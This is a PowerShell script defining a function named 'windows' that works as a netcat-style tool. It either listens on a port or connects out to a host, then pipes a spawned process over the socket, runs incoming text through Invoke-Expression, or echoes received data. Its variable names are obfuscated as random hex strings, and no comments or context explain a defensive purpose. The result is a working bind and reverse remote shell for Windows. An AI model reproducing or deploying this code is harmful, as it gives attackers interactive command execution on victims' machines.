function windows {
  param(
    [string]$c = "",
    [switch]$l = $False,
    [string]$p = "",
    [string]$e = "",
    [switch]$ep = $False,
    [int]$t = 60
  )

  function Get-Stream {
    param($84b5d7ab8755451cb386a79589e39fa8, $3b95c1d3d7dc4e4fa6474ce1bceae743, $367ad63a4a834bf5bb275aab24a4890c, $d084ee484cf44c09003024847840f3d)
    if ($3b95c1d3d7dc4e4fa6474ce1bceae743) {
      $b16fd2353f0d413484e1583776256f61 = New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Any), [int]$367ad63a4a834bf5bb275aab24a4890c
      $b16fd2353f0d413484e1583776256f61.Start()
      $b396f8bb13ec47c28e4f721085e95361 = [Diagnostics.Stopwatch]::StartNew()
      while ($b396f8bb13ec47c28e4f721085e95361.Elapsed.TotalSeconds -lt $d084ee484cf44c09003024847840f3d) {
        if ($b16fd2353f0d413484e1583776256f61.Pending()) {
          $2bfb84697b834fa09479071ec68d6b19 = $b16fd2353f0d413484e1583776256f61.AcceptTcpClient()
          $b16fd2353f0d413484e1583776256f61.Stop()
          return $2bfb84697b834fa09479071ec68d6b19.GetStream()
        }
        Start-Sleep -Milliseconds 100
      }
      $b16fd2353f0d413484e1583776256f61.Stop()
      throw "listen timeout"
    } else {
      $2bfb84697b834fa09479071ec68d6b19 = New-Object System.Net.Sockets.TcpClient
      $12e0e1f0c5e14474b53907ee11f75ed7 = $2bfb84697b834fa09479071ec68d6b19.BeginConnect($84b5d7ab8755451cb386a79589e39fa8, [int]$367ad63a4a834bf5bb275aab24a4890c, $null, $null)
      if (-not $12e0e1f0c5e14474b53907ee11f75ed7.AsyncWaitHandle.WaitOne($d084ee484cf44c09003024847840f3d * 1000)) { $2bfb84697b834fa09479071ec68d6b19.Close(); throw "connect timeout" }
      $2bfb84697b834fa09479071ec68d6b19.EndConnect($12e0e1f0c5e14474b53907ee11f75ed7)
      return $2bfb84697b834fa09479071ec68d6b19.GetStream()
    }
  }

  function Invoke-String {
    param($9a3c7f2b1d8e4a6c5b0f9e2d7a4c1b8e)
    try { return (Invoke-Expression $9a3c7f2b1d8e4a6c5b0f9e2d7a4c1b8e 2>&1 | Out-String) }
    catch { return ($_ | Out-String) }
  }

  function Start-Child {
    param($6d1e8a3f9c2b7e4d0a5f8c1b3e6d9a2f)
    $7c2e9b4a1f8d3e6c0b5a9f2d8e1c4b7a = New-Object System.Diagnostics.ProcessStartInfo
    $7c2e9b4a1f8d3e6c0b5a9f2d8e1c4b7a.FileName               = $6d1e8a3f9c2b7e4d0a5f8c1b3e6d9a2f
    $7c2e9b4a1f8d3e6c0b5a9f2d8e1c4b7a.UseShellExecute        = $False
    $7c2e9b4a1f8d3e6c0b5a9f2d8e1c4b7a.RedirectStandardInput  = $True
    $7c2e9b4a1f8d3e6c0b5a9f2d8e1c4b7a.RedirectStandardOutput = $True
    $7c2e9b4a1f8d3e6c0b5a9f2d8e1c4b7a.RedirectStandardError  = $True
    return [System.Diagnostics.Process]::Start($7c2e9b4a1f8d3e6c0b5a9f2d8e1c4b7a)
  }

  # ================= main =================
  $a1b2c3d4e5f60718293a4b5c6d7e8f90 = Get-Stream $c $l $p $t
  $f0e1d2c3b4a5968778695a4b3c2d1e0f = [System.Text.Encoding]::ASCII
  $9182736455463728190a0b0c0d0e0f10 = New-Object byte[] 65536

  if ($e -ne "") {
    # ---- process mode ----
    $11223344556677889900aabbccddeeff = Start-Child $e
    $2233445566778899aabbccddeeff0011 = New-Object byte[] 65536
    $33445566778899aabbccddeeff001122 = New-Object byte[] 65536
    $445566778899aabbccddeeff00112233 = $11223344556677889900aabbccddeeff.StandardOutput.BaseStream.BeginRead($2233445566778899aabbccddeeff0011, 0, 65536, $null, $null)
    $5566778899aabbccddeeff0011223344 = $11223344556677889900aabbccddeeff.StandardError.BaseStream.BeginRead($33445566778899aabbccddeeff001122, 0, 65536, $null, $null)

    while ($True) {
      if ($a1b2c3d4e5f60718293a4b5c6d7e8f90.DataAvailable) {
        $66778899aabbccddeeff001122334455 = $a1b2c3d4e5f60718293a4b5c6d7e8f90.Read($9182736455463728190a0b0c0d0e0f10, 0, $9182736455463728190a0b0c0d0e0f10.Length)
        if ($66778899aabbccddeeff001122334455 -le 0) { break }
        $778899aabbccddeeff00112233445566 = $f0e1d2c3b4a5968778695a4b3c2d1e0f.GetString($9182736455463728190a0b0c0d0e0f10, 0, $66778899aabbccddeeff001122334455)
        $11223344556677889900aabbccddeeff.StandardInput.Write($778899aabbccddeeff00112233445566)
        $11223344556677889900aabbccddeeff.StandardInput.Flush()
      }
      if ($445566778899aabbccddeeff00112233.IsCompleted) {
        $8899aabbccddeeff0011223344556677 = $11223344556677889900aabbccddeeff.StandardOutput.BaseStream.EndRead($445566778899aabbccddeeff00112233)
        if ($8899aabbccddeeff0011223344556677 -gt 0) {
          $a1b2c3d4e5f60718293a4b5c6d7e8f90.Write($2233445566778899aabbccddeeff0011, 0, $8899aabbccddeeff0011223344556677)
          $a1b2c3d4e5f60718293a4b5c6d7e8f90.Flush()
          $445566778899aabbccddeeff00112233 = $11223344556677889900aabbccddeeff.StandardOutput.BaseStream.BeginRead($2233445566778899aabbccddeeff0011, 0, 65536, $null, $null)
        }
      }
      if ($5566778899aabbccddeeff0011223344.IsCompleted) {
        $99aabbccddeeff001122334455667788 = $11223344556677889900aabbccddeeff.StandardError.BaseStream.EndRead($5566778899aabbccddeeff0011223344)
        if ($99aabbccddeeff001122334455667788 -gt 0) {
          $a1b2c3d4e5f60718293a4b5c6d7e8f90.Write($33445566778899aabbccddeeff001122, 0, $99aabbccddeeff001122334455667788)
          $a1b2c3d4e5f60718293a4b5c6d7e8f90.Flush()
          $5566778899aabbccddeeff0011223344 = $11223344556677889900aabbccddeeff.StandardError.BaseStream.BeginRead($33445566778899aabbccddeeff001122, 0, 65536, $null, $null)
        }
      }
      if ($11223344556677889900aabbccddeeff.HasExited) { break }
      Start-Sleep -Milliseconds 20
    }
    try { $11223344556677889900aabbccddeeff.Kill() } catch {}
  }
  elseif ($ep) {
    # ---- powershell mode ----
    $aabbccddeeff00112233445566778899 = 'PS ' + (Get-Location).Path + '> '
    $bbccddeeff00112233445566778899aa = $f0e1d2c3b4a5968778695a4b3c2d1e0f.GetBytes($aabbccddeeff00112233445566778899)
    $a1b2c3d4e5f60718293a4b5c6d7e8f90.Write($bbccddeeff00112233445566778899aa, 0, $bbccddeeff00112233445566778899aa.Length)
    $a1b2c3d4e5f60718293a4b5c6d7e8f90.Flush()

    while ($True) {
      if (-not $a1b2c3d4e5f60718293a4b5c6d7e8f90.DataAvailable) { Start-Sleep -Milliseconds 20; continue }
      $ccddeeff00112233445566778899aabb = $a1b2c3d4e5f60718293a4b5c6d7e8f90.Read($9182736455463728190a0b0c0d0e0f10, 0, $9182736455463728190a0b0c0d0e0f10.Length)
      if ($ccddeeff00112233445566778899aabb -le 0) { break }
      $ddeeff00112233445566778899aabbcc = $f0e1d2c3b4a5968778695a4b3c2d1e0f.GetString($9182736455463728190a0b0c0d0e0f10, 0, $ccddeeff00112233445566778899aabb)
      $eeff00112233445566778899aabbccdd = Invoke-String $ddeeff00112233445566778899aabbcc
      $ff00112233445566778899aabbccddee = $eeff00112233445566778899aabbccdd + 'PS ' + (Get-Location).Path + '> '
      $00112233445566778899aabbccddeeff = $f0e1d2c3b4a5968778695a4b3c2d1e0f.GetBytes($ff00112233445566778899aabbccddee)
      $a1b2c3d4e5f60718293a4b5c6d7e8f90.Write($00112233445566778899aabbccddeeff, 0, $00112233445566778899aabbccddeeff.Length)
      $a1b2c3d4e5f60718293a4b5c6d7e8f90.Flush()
    }
  }
  else {
    # ---- console mode ----
    while ($True) {
      if ($a1b2c3d4e5f60718293a4b5c6d7e8f90.DataAvailable) {
        $11223344556677889900aabbccddeeff = $a1b2c3d4e5f60718293a4b5c6d7e8f90.Read($9182736455463728190a0b0c0d0e0f10, 0, $9182736455463728190a0b0c0d0e0f10.Length)
        if ($11223344556677889900aabbccddeeff -le 0) { break }
        Write-Host -NoNewline $f0e1d2c3b4a5968778695a4b3c2d1e0f.GetString($9182736455463728190a0b0c0d0e0f10, 0, $11223344556677889900aabbccddeeff)
      }
      Start-Sleep -Milliseconds 50
    }
  }

  try { $a1b2c3d4e5f60718293a4b5c6d7e8f90.Close() } catch {}
}